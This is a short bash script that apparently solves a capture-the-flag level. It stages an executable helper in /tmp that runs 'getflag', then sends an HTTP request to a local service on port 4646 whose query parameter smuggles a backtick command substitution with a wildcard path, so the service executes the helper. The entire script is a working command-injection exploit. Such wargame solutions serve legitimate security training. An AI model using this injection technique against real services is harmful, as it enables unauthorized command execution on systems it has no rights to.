#!/bin/bash
echo -e "#!/bin/sh\ngetflag > /tmp/flaglevel12" > /tmp/CMD
chmod +x /tmp/CMD
curl "http://127.0.0.1:4646?x=\`/*/CMD\`"
cat /tmp/flaglevel12